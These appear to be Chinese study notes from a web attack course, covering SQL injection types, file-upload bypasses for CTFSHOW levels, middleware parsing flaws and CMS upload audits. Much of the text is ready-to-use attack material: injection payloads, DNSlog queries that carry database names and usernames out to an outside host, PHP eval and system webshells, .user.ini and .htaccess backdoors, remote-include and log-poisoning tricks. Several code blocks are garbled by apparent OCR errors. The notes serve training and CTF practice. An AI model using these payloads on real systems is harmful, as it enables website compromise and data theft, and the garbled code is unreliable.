<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#部分语言接受代码块</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">Sget=<span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>];</span><br><span class="line">Spost=<span class="variable">$_POST</span>[<span class="string">&#x27;p]:I</span></span><br><span class="line"><span class="string">Scookie=$_COOKIE[&#x27;</span>c<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">Srequest=&amp;_ REQUESTT&#x27;</span>r]:</span><br><span class="line">Shost=S SERVER[<span class="string">&#x27;HTTP HOST];</span></span><br><span class="line"><span class="string">Suser agent=$SERVER[&quot;HTTP USER AGENT].</span></span><br><span class="line"><span class="string">Sip=$SERVER[HTTP X FORWARDED FOR&quot;]:</span></span><br><span class="line"><span class="string">echo $get.&quot;&lt;hr&gt;&quot;</span></span><br><span class="line"><span class="string">echo $post.&quot;&lt;hr&gt;&quot;:</span></span><br><span class="line"><span class="string">echo $cookie.&quot;&lt;hr&gt;&quot;</span></span><br><span class="line"><span class="string">echo $request.&quot;&lt;hr&gt;&quot;:</span></span><br><span class="line"><span class="string">echo $host.&quot;&lt;hr&gt;&quot;;</span></span><br><span class="line"><span class="string">echo $user agent.&quot;&lt;hr&gt;&quot;;</span></span><br><span class="line"><span class="string">echo $ip;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="第29天-WEB攻防-通用漏洞-SQL注入-增删改查-盲注-延时-布尔-报错"><a href="#第29天-WEB攻防-通用漏洞-SQL注入-增删改查-盲注-延时-布尔-报错" class="headerlink" title="第29天 WEB攻防-通用漏洞&amp;SQL注入&amp;增删改查&amp;盲注&amp;延时&amp;布尔&amp;报错"></a>第29天 WEB攻防-通用漏洞&amp;SQL注入&amp;增删改查&amp;盲注&amp;延时&amp;布尔&amp;报错</h1><h4 id="知识点：-12"><a href="#知识点：-12" class="headerlink" title="知识点："></a>知识点：</h4><p>1、明确查间方式注入Payload<br>2、明确查询方式注入产生功能</p>
<p>3、明确SQL言注延时&amp;布尔&amp;报错</p>
<h4 id="详细点：-2"><a href="#详细点：-2" class="headerlink" title="#详细点："></a>#详细点：</h4><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。<br>此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br>我们可以知道盲注分为以下三类：<br>基于布尔的SQL直注逻辑判断<br>regexp,like,ascii,left,ord.mid<br>基于时间的SQL盲注延时判断<br>if,sleep<br>基于报错的SQL盲注报措回显<br>floor,updatexml,extractvalue<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
<p>#参考：<br>like ‘ro% #判断0或0.是否成立<br>regexp “xiaod[a-Z]’ #匹配xiaodi及xiaodi.等<br>if(条件，5,0) #条件成立返回5反之返回0<br>sleep(5) #SQL语句延时执行5秒<br>mid(a.b.c) #从位置b开始，载取a字符串的c位<br>substr(a,b,c) #从位置b开始，截取字符串a的c长度<br>left(database0,1),database0 #let(a,b)从左侧截取a的前b位<br>length(database0)&#x3D;8 #判折数据库database(O名的长度<br>ord&#x3D;ascii ascii(X)&#x3D;97 #判新x的asciit码是否等于97</p>
<p>SQL查询方式汪入<br>select insert update delete orderby等</p>
<h4 id="演示案例：-8"><a href="#演示案例：-8" class="headerlink" title="演示案例："></a>演示案例：</h4><p>SQL-盲注&amp;布尔&amp;报错&amp;延时<br>查-select-xhcms-布尔盲注       <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/264357.html">https://www.freebuf.com/articles/web/264357.html</a>    ——–xhcms的各种漏洞</p>
<p>插入-insert-xhcms-报错盲注<br>更新-update-xhcms-&#x3D;报错盲注<br>删除-delete-kkcms-延时盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#SQL-盲注&amp;布尔&amp;报措&amp;延时 PHP开发项目输出结果&amp;开启报措</span><br><span class="line">基于延时： /blog/news.php?id=1 and if(1=1,sleep(5),0) 不需要输出</span><br><span class="line">通过if后面的判断语句去猜解信息，比如if(length(database())=1,sleep(5),0)判断数据库长度是否为1，若猜解正确则返回时间延时5秒</span><br><span class="line">基于布尔： /blog/news.php?id=1 and length(database（）=7 需要有数据库输出判断标注</span><br><span class="line">基于报错：/blog/news.php?id=2 and updatexml(1,concat(Ox7e,(SELECT@@version),0x7e).1)</span><br><span class="line">需要有数据库输出报错处理=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">到这里sql注入终于也是结束了，sql注入也是CTF中的很大一考点，基本上每场比赛都有sql的身影。</span><br></pre></td></tr></table></figure>

<h1 id="第30天-WEB攻防-通用漏洞-SQL注入-CTF-二次-堆叠-DNS带外"><a href="#第30天-WEB攻防-通用漏洞-SQL注入-CTF-二次-堆叠-DNS带外" class="headerlink" title="第30天 WEB攻防-通用漏洞&amp;SQL注入&amp;CTF&amp;二次&amp;堆叠&amp;DNS带外"></a>第30天 WEB攻防-通用漏洞&amp;SQL注入&amp;CTF&amp;二次&amp;堆叠&amp;DNS带外</h1><h4 id="知识点：-13"><a href="#知识点：-13" class="headerlink" title="知识点："></a>知识点：</h4><h6 id="1、数据库堆叠注入"><a href="#1、数据库堆叠注入" class="headerlink" title="1、数据库堆叠注入"></a>1、数据库堆叠注入</h6><p>根据数据库类型决定是否支持多条语句执行</p>
<h6 id="2、数据库二次注入"><a href="#2、数据库二次注入" class="headerlink" title="2、数据库二次注入"></a>2、数据库二次注入</h6><p>应用功能逻辑涉及上导致的先写入后组合的注入</p>
<h6 id="3、数据库Dnslog注入"><a href="#3、数据库Dnslog注入" class="headerlink" title="3、数据库Dnslog注入"></a>3、数据库Dnslog注入</h6><p>解决不回显（反向连接），SQL注入，命令执行，SSRF等</p>
<h6 id="4、黑盒模式分析以上"><a href="#4、黑盒模式分析以上" class="headerlink" title="4、黑盒模式分析以上"></a>4、黑盒模式分析以上</h6><p>二次注入：插入后调用显示操作符合        </p>
<p><img src="https://image.3001.net/images/20200921/1600691018_5f689b4a264c5e1261c28.png!small" alt="1600691018_5f689b4a264c5e1261c28.png!small"></p>
<p>堆叠注入：判断注入后直接调多条执行<br>DNS注入：在注入上没太大利用价值，其他还行        <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45300786/article/details/107764907">https://blog.csdn.net/qq_45300786/article/details/107764907</a>       一种很新的思路，dns外带的</p>
<h4 id="演示案例：-9"><a href="#演示案例：-9" class="headerlink" title="演示案例："></a>演示案例：</h4><p>二次注入-74CMS&amp;网鼎杯2018 Unfinish</p>
<p>堆叠注入-数据库类型&amp;强网杯2019随便注<br>DNS利用-平台介绍&amp;SQL注入&amp;命令执行等</p>
<h6 id="二次注入-74CMS-网鼎杯2018-Unfinish"><a href="#二次注入-74CMS-网鼎杯2018-Unfinish" class="headerlink" title="#二次注入-74CMS&amp;网鼎杯2018 Unfinish"></a>#二次注入-74CMS&amp;网鼎杯2018 Unfinish</h6><p>CTF-I网鼎杯2018 Unfinish<br>CMS-74CMS个人会员中心</p>
<h6 id="堆叠注入数据库类型-强网杯2019随便注"><a href="#堆叠注入数据库类型-强网杯2019随便注" class="headerlink" title="#堆叠注入数据库类型&amp;强网杯2019随便注"></a>#堆叠注入数据库类型&amp;强网杯2019随便注</h6><p>根据数据库类型决定是否支持多条语句执行<br>支持堆叠数据库类型：MYSQL MSSQL Postgresql等<br>‘;show databases;<br>‘;show tables;<br>‘;show columns from&#96;1919810931114514:<br>‘;select flag from ‘1919810931114514’:<br>‘;SeT<br>@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460:p<br>repare execsql from @a;execute execsql;</p>
<h6 id="DNS利用-平台介绍-SQL注入-命令执行等"><a href="#DNS利用-平台介绍-SQL注入-命令执行等" class="headerlink" title="#DNS利用-平台介绍&amp;SQL注入&amp;命令执行等"></a>#DNS利用-平台介绍&amp;SQL注入&amp;命令执行等</h6><p>1.平台<br><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a><br><a target="_blank" rel="noopener" href="http://admin.dnslog.link/">http://admin.dnslog.link</a><br><a target="_blank" rel="noopener" href="http://ceve.io/">http://ceve.io</a><br>2.应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等<br>SQL注入：<br>select load file(concat(“‘,(select database（）,.7logee.dnslog.cnllaa’));<br>and (select load_file(concat(&#x2F;&#x2F;,(select database（）),‘.69knl9.dnslog.cn&#x2F;abc’)))<br>命令执行：<br>ping %USERNAME%.7logee.dnslog.cn</p>
<h1 id="第31天-WEB攻防-通用漏洞-文件上传-js验证-mime-user-ini-语言特性"><a href="#第31天-WEB攻防-通用漏洞-文件上传-js验证-mime-user-ini-语言特性" class="headerlink" title="第31天 WEB攻防-通用漏洞&amp;文件上传&amp;js验证&amp;mime&amp;user.ini&amp;语言特性"></a>第31天 WEB攻防-通用漏洞&amp;文件上传&amp;js验证&amp;mime&amp;user.ini&amp;语言特性</h1><h4 id="知识点：-14"><a href="#知识点：-14" class="headerlink" title="知识点："></a>知识点：</h4><p>1、文件上传-前端验证<br>2、文件上传-黑白名单<br>3、文件上传user.in妙用<br>4、文件上传-<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=PHP%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020">PHP语言</a>特性</p>
<h4 id="详细点：-3"><a href="#详细点：-3" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渲染等<br>3、检测后缀：黑名单，白名单，MME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竟争等</p>
<h4 id="本章课程内容："><a href="#本章课程内容：" class="headerlink" title="#本章课程内容："></a>#本章课程内容：</h4><p>1、文件上传-CTF赛题知识点<br>2、文件上传中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p>
<h4 id="演示案例：-10"><a href="#演示案例：-10" class="headerlink" title="演示案例："></a>演示案例：</h4><p>CTFSHOW文件上传-151到161关卡<br>151关 前端过滤–直接修改前端允许上传的类型绕过<br>152关 前后端同时过滤–修改前端代码允许php文件上传–burp抓包修改content-type为image&#x2F;png绕过<br>153关 前后端过滤同时严格过滤参数–上传.user.ini配置文件并将内容写为auto_prepend_file&#x3D;test.txt–上传写有webshell的文件（可以为text也可以为png）–访问index.php即可反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">补充知识：</span><br><span class="line"></span><br><span class="line">配置文件 ：php.ini</span><br><span class="line">配置文件（php.ini）在 PHP 启动时被读取。对于服务器模块版本的 PHP，仅在 web 服务器启动时读取一次。对于 CGI 和</span><br><span class="line">CLI 版本，每次调用都会读取。(PHP: 配置文件 - Manual)</span><br><span class="line">实际上，除了PHP_INI_SYSTEM以外的模式都是可以通过.user.ini来设置的。而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</span><br><span class="line">这里就很清楚了，.user.ini实际上就是一个可以由用户”自定义“的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR</span><br><span class="line">、 PHP_INI_USER”的设置。</span><br><span class="line">其中有两个配置，可以用来制造后门：</span><br><span class="line">auto_append_file ; 指定一个文件，自动包含在要执行的文件前。</span><br><span class="line">auto_prepend_file ;指定一个文件，自动包含在要执行的文件后。 使用方法很简单，直接写在.user.ini中：</span><br><span class="line">auto_prepend_file=test.txt</span><br><span class="line">或者</span><br><span class="line">auto_append_file=test.txt</span><br></pre></td></tr></table></figure>

<p>154155关-JS验证+User.ini+短标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?echo &#x27;123&#x27; ?&gt; //前提是开启配置参数short open tags=on &lt;=(表达式）？&gt;</span><br><span class="line">//不需要开启参数设置 &lt;%echo ‘123’;%&gt; / /前提是开启配置参数asp tags=on</span><br><span class="line"></span><br><span class="line">//不需要修改参数开关 user.ini:auto_prepend_file=test.png test.png:&lt;?=eval($_POST[x]);?&gt; 思路：先尝试图片文件（发现验证不通过）--修改前端代码（存在后端验证）--burp修改文件类型--仍提示文件类型错误（尝试上传user.ini文件）--对png文件中的代码进行过滤（会检查文件中&lt;? php ?&gt;）中的php字段--使用不含php字段的代码（比如 :&lt;?=eval($_POST[x]);?&gt;）</span><br></pre></td></tr></table></figure>

<p>156关 JS验证+user.ini+短标签+过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">过滤 []</span><br><span class="line">user.ini:auto_prepend_file=test.png</span><br><span class="line">test png:&lt;?=eval($_POST&#123;x&#125;),?&gt;</span><br></pre></td></tr></table></figure>

<p>157-158-159JS验证+user ini+短标签+过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.ini: auto_prepend_file=test.png</span><br><span class="line">test.png:&lt;?=system(&#x27;tac../fl*&#x27;)?&gt;</span><br><span class="line">test.png:&lt;?=&#x27;tac../fl*&#x27;)?&gt; //使用反引号运算符的效果与函数shell exec(相同 )</span><br><span class="line">test.png:&lt;echo &#x27;tac /var/www/htmlf*?&gt;</span><br></pre></td></tr></table></figure>

<p>160-JS验证+User.ini-短标签+过德</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">再过滤严格的情况下，可以采用通过burp将后门代码写入UA头中，然后写入.user.ini配置文件，将日志文件通过文件包含访问，那么在访问png文件时就是访问日志文件，就会显示后门代码从而达到调用的目的</span><br><span class="line">包含默认日志，日志记录UA头，UA头写后门代码</span><br><span class="line">user.ini:auto_prepend_file-test.png</span><br><span class="line">test.png:&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>161-JS验证+User.ni+短标签+过滤+文件头</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件头部检测是否为图片格式文件</span><br><span class="line">user ini:GIF89A auto_prepend_file=test.png</span><br><span class="line">test.png:GIF89A &lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">补充：主要就是可以去ctfshow上去刷题，上面的题很好，而且这个知识点也是ctf的常考。</span><br></pre></td></tr></table></figure>

<h1 id="第32天-WEB攻防-通用漏洞-文件上传-二次洹染8-htaccess-变异免杀"><a href="#第32天-WEB攻防-通用漏洞-文件上传-二次洹染8-htaccess-变异免杀" class="headerlink" title="第32天 WEB攻防-通用漏洞&amp;文件上传&amp;二次洹染8&amp;htaccess&amp;变异免杀"></a>第32天 WEB攻防-通用漏洞&amp;文件上传&amp;二次洹染8&amp;htaccess&amp;变异免杀</h1><h4 id="知识点：-15"><a href="#知识点：-15" class="headerlink" title="知识点："></a>知识点：</h4><p>1、文件上传-二次渣染<br>2、文件上传-简单免杀变异<br>3、文件上传-.htaccess妙用<br>4、文件上传-PHP语言特性</p>
<h4 id="详细点：-4"><a href="#详细点：-4" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渣染等<br>3、检测后缀：黑名单，白名单，MIME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等</p>
<h4 id="本章课程内容：-1"><a href="#本章课程内容：-1" class="headerlink" title="#本章课程内容："></a>#本章课程内容：</h4><p>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全</p>
<p>3、文件上传-实例CMS文件上传安全分析</p>
<h4 id="前置："><a href="#前置：" class="headerlink" title="#前置："></a>#前置：</h4><p>后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)<br>如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门</p>
<h4 id="二次渲染判断：-——较难"><a href="#二次渲染判断：-——较难" class="headerlink" title="二次渲染判断：        ——较难"></a>二次渲染判断：        ——较难</h4><p>1、上传前后文件大小不同<br>2、上传后图片返回内容包含明显的二次渲染标志</p>
<h4 id="演示案例：-11"><a href="#演示案例：-11" class="headerlink" title="演示案例："></a>演示案例：</h4><p>CTFSHOW-文件上传-162到170关卡<br>162 突破过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤 . () &#123;&#125; 等</span><br><span class="line">利用远程包含IP转换地址后门调用执行</span><br><span class="line">.user.ini auto_prepend_file=png</span><br><span class="line">png &lt;?=include’http://794750069/&gt;</span><br><span class="line">https://www.bejson.com/convert/ip2int/</span><br></pre></td></tr></table></figure>

<p>163 突破上传刷除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤 . () &#123;&#125;等同时文件被删测除</span><br><span class="line">直接利用user.ini包含远程</span><br><span class="line">auto_prepend_file=http://794750069/</span><br><span class="line">auto_prepend_file=http://794750069/</span><br></pre></td></tr></table></figure>

<p>164 png二次渲染</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https //blog.csdn.net/qq 40800734/article/details/105920149</span><br><span class="line">get：0=system post：1=tac flag.php</span><br><span class="line">将后门代码写入图片（前提，读取文件是通过php解析，导致后门代码可执行）</span><br></pre></td></tr></table></figure>

<p>165 jpg二次渲染</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、先上传jpg正常，返回包发现渲染</span><br><span class="line">2、上传jpg渲染后保存，生成带代码图片</span><br><span class="line">调用执行：php jpg .php 1.jpg</span><br></pre></td></tr></table></figure>

<p>166 zip调用包含</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接上传zip后修改代码</span><br><span class="line"></span><br><span class="line">&lt;?=eval($POST[x]),?&gt;</span><br></pre></td></tr></table></figure>

<p>167 .htaccess妙用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.htaccess默认不支持nginx,设置后支持</span><br><span class="line">.htaccess可以通过设置实现文件解析配置</span><br><span class="line">将png后缀的文件解析成php</span><br><span class="line">AddType application/x-httpd-php png</span><br><span class="line">将png后缀的文件解析成php</span><br></pre></td></tr></table></figure>

<p>168 免杀后门（构造变量绕过函数过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a=&#x27;syste&#x27;;$b=&#x27;m&#x27;,$c=$a.$b;$c(tac ./flagaa.php&#x27;):?&gt;</span><br></pre></td></tr></table></figure>

<p>169 170 日志包含</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">构造.user.in利用条件：上传index.php内容随意</span><br><span class="line">上传.user.ini包含日志：auto_prepend_fle=var/log/nginx/access.log</span><br><span class="line">访问地址带后门UA头写入日志：&lt;？=eval($POST[X):?&gt;</span><br><span class="line">上传.user.ini是利用文件包含 上传.htaccess是利用文件解析漏洞</span><br></pre></td></tr></table></figure>

<h1 id="第33天-WEB攻防-通用漏洞-文件上传-中间件解析漏洞8似编器安全"><a href="#第33天-WEB攻防-通用漏洞-文件上传-中间件解析漏洞8似编器安全" class="headerlink" title="第33天 WEB攻防-通用漏洞&amp;文件上传&amp;中间件解析漏洞8似编器安全"></a>第33天 WEB攻防-通用漏洞&amp;文件上传&amp;中间件解析漏洞8似编器安全</h1><h4 id="知识点：-16"><a href="#知识点：-16" class="headerlink" title="知识点："></a>知识点：</h4><p>1、文件上传-二次渣染<br>2、文件上传-简单免杀变异<br>3、文件上传-.htaccess妙用<br>4、文件上传-PHP语言特性</p>
<h4 id="详细点：-5"><a href="#详细点：-5" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渣染等<br>3、检测后缀：黑名单，白名单，MIME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等</p>
<h4 id="本章课程内容：-2"><a href="#本章课程内容：-2" class="headerlink" title="#本章课程内容："></a>#本章课程内容：</h4><p>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p>
<h4 id="演示案例：-12"><a href="#演示案例：-12" class="headerlink" title="演示案例："></a>演示案例：</h4><p>中间件文件解析-lIS&amp;Apache&amp;Nginx<br>Web应用编辑器-Ueditor文件上传安全<br>实例CMS&amp;平台-中间件解析&amp;编辑器引用</p>
<p>#中间件文件解析-llS&amp;Apache&amp;Nginx<br>IIS 6 7文件名目录名<br>1、文件名：X.asp;.x.jpg<br>2、目录名：x.asp&#x2F;x.jpg<br>3、S7.X与Nginx解析漏洞一致<br>(该漏洞实现的条件：1中间件类型为IIS且版本对应 2、上传文件能不能修改目录或上传的文件名能增加命名)<br>(漏洞防护：严格命名规则：基于本地名命名、基于时间命名、基于随机字符命名 上传的文件名固定且目录无法创建则漏洞无法实现）</p>
<h4 id="Apache换行解析配置不当"><a href="#Apache换行解析配置不当" class="headerlink" title="#Apache换行解析配置不当"></a>#Apache换行解析配置不当</h4><p>1、换行解析-CVE-2017-15715      <a target="_blank" rel="noopener" href="https://blog.csdn.net/youthbelief/article/details/121258770">https://blog.csdn.net/youthbelief/article/details/121258770</a>   复现文章<br>其2.4.0~2.4.29版本中存在一个解析漏洞</p>
<p>2、配置不当-.htaccess配置不当<br>AddHandier application&#x2F;x-httpd-php .php</p>
<h4 id="Nginx-文件名逻辑解析漏洞"><a href="#Nginx-文件名逻辑解析漏洞" class="headerlink" title="#Nginx 文件名逻辑解析漏洞"></a><strong>#Nginx 文件名逻辑解析漏洞</strong></h4><p>1,文件名逻辑-CVE-2013-4547<br>影响版本：Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7<br>注意此处文件名后要加空格</p>
<p>2.解析漏洞-nginx.conf配置不当<br>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p>
<h4 id="Web应用编辑器-Ueditor文件上传安全"><a href="#Web应用编辑器-Ueditor文件上传安全" class="headerlink" title="#Web应用编辑器-Ueditor文件上传安全"></a><strong>#Web应用编辑器-Ueditor文件上传安全</strong></h4><p>思路：制作图片马–将图片马上传到vps–上述代码保存为html文件，将访问地址修改为编译器地址—访问html文件将图片马地址填入（构造好的<a target="_blank" rel="noopener" href="http://xxxx/ueditor.jpg?.aspx%EF%BC%89%E2%80%93%E7%82%B9%E5%87%BBsubmit%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%EF%BC%8C%E5%B9%B6%E8%BF%94%E5%9B%9E%E6%88%91%E4%BB%AC%E7%9A%84aspx%E8%84%9A%E6%9C%AC%E6%9C%A8%E9%A9%AC%E8%B7%AF%E5%BE%84%E5%9C%B0%E5%9D%80%E2%80%93shell%E8%BF%9E%E6%8E%A5">http://xxxx/ueditor.jpg?.aspx）–点击submit，直接上传成功，并返回我们的aspx脚本木马路径地址–shell连接</a><br>参考文章：<a target="_blank" rel="noopener" href="https://codeleading.com/article/27805571408/#google_vignette">https://codeleading.com/article/27805571408/#google_vignette</a></p>
<h4 id="实例CMS-平台-中间件解析-编辑器引用"><a href="#实例CMS-平台-中间件解析-编辑器引用" class="headerlink" title="#实例CMS&amp;平台-中间件解析&amp;编辑器引用"></a>#实例CMS&amp;平台-中间件解析&amp;编辑器引用</h4><p>1、中间件配置不当导致文件被恶意解析<br>2、CMS源码引用外部编辑器实现文件上传</p>
<h1 id="第34天-WEB攻防-通用漏同8-文件上传8黑白盒审计8逻捐-中间件-外部引用"><a href="#第34天-WEB攻防-通用漏同8-文件上传8黑白盒审计8逻捐-中间件-外部引用" class="headerlink" title="第34天 WEB攻防-通用漏同8&amp;文件上传8黑白盒审计8逻捐&amp;中间件&amp;外部引用"></a>第34天 WEB攻防-通用漏同8&amp;文件上传8黑白盒审计8逻捐&amp;中间件&amp;外部引用</h1><h4 id="知识点：-17"><a href="#知识点：-17" class="headerlink" title="知识点："></a>知识点：</h4><p>1、白盒审计三要素<br>2、黑盒审计四要素<br>3、白黑测试流程思路</p>
<h4 id="详细点：-6"><a href="#详细点：-6" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渲染等<br>3、检测后缀：黑名单，白名单，MIME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竟争等</p>
<h4 id="本章课程内容：-3"><a href="#本章课程内容：-3" class="headerlink" title="#本章课程内容："></a>#本章课程内容：</h4><p>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p>
<h4 id="演示案例-1"><a href="#演示案例-1" class="headerlink" title="演示案例"></a>演示案例</h4><p>白盒审计-Finecms-代码常规-处理逻辑<br>白盒审计-CuppaCms-中间件.htaccess<br>白盒审计-Metinfo–编辑器引用-第三方安全</p>
<h4 id="白盒审计-Finecms-代码常规-处理逻辑"><a href="#白盒审计-Finecms-代码常规-处理逻辑" class="headerlink" title="#白盒审计-Finecms-代码常规-处理逻辑"></a>#白盒审计-Finecms-代码常规-处理逻辑</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52920608/article/details/124457816">https://blog.csdn.net/m0_52920608/article/details/124457816</a></p>
<p>黑盒思路：寻找上传点抓包修改突破获取状态码及地址<br>审计流程：功能点代码文件代码块抓包调试验证测试</p>
<h4 id="白盒审计-CuppaCms-中间件-htaccess"><a href="#白盒审计-CuppaCms-中间件-htaccess" class="headerlink" title="#白盒审计-CuppaCms-中间件-.htaccess"></a>#白盒审计-CuppaCms-中间件-.htaccess</h4><p>总结：漏洞产生位置在用户中心上传头像处，因为未对文件内容进行过滤导致可以上传含有后门代码的文件，但是文件上传后会对文件进行重新命名，黑盒测试中会因为不知道上传文件路径文件名导致无法连接shell，白盒测试中则可以看到文件被命名为0x00.php</p>
<p>黑盒思路：存在文件管理上传改名奕破，访问后在突破<br>审计流程：功能点代码文件-代码块抓包调试验证测试<br>总结：上传点在后台文件管理–修改名称处–上传出会对文件进行严格过滤且会对文件进行重命名导致上传.user.in和.htaccess上传失败（白名单），在文件管理处可以对文件进行重命名，此处抓包可以抓到重命名的数据包，修改重命名后的文件名可以将png文件修改成php文件，访问发现403，是由于.htaccess配置文件导致media文件夹下php exe php5 等后缀名无法访问，在重命名处改包.&#x2F;&#x2F; 将文件上传到上一级目录绕过，文件访问正常。第二种绕过思路：直接把.htaccess文件删除。</p>
<h4 id="白盒审计-Metinfo-编辑器引用-第三方安全"><a href="#白盒审计-Metinfo-编辑器引用-第三方安全" class="headerlink" title="#白盒审计-Metinfo-编辑器引用-第三方安全"></a>#白盒审计-Metinfo-编辑器引用-第三方安全</h4><p>黑盒思路：探针目录利用编辑器漏洞验证测试<br>审计流程：目录结构-引用编辑器编辑器安全查询-EXP利用验证<br>总结：目录扫描–扫描出fackeditor目录–判断版本–使用exp上传webshell</p>
